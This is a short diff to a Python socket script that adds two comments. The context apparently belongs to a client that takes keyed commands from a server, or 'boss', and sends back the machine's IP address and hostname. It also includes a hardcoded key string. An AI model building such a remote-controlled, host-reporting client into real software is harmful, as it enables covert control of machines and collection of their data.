@@ -3,6 +3,8 @@ import os
 import sys
 import platform
 
+# Keys to send different types of data
+
 Job_key = "THIS IS A JOB TASK"
 server_private_key = "8d6fsdfh39ur893uruf86we7f58734y uihuhUYGIUDHS*&AD9d8 3yuh78y(*iu(d*&D"
 expression_key = "This is an expresiion"
@@ -42,6 +44,8 @@ def handle_messages(connection: socket.socket):
                         # sock = socket.socket()
                         # sock.connect((SERVER_ADDRESS, SERVER_PORT))
                         sock.send(IP.encode())
+
+                    #   Return different data to boss depending on server broadcast
 
                     elif (msg.decode()).strip(Job_key) == "hostthing":
                         print("sending hostname")
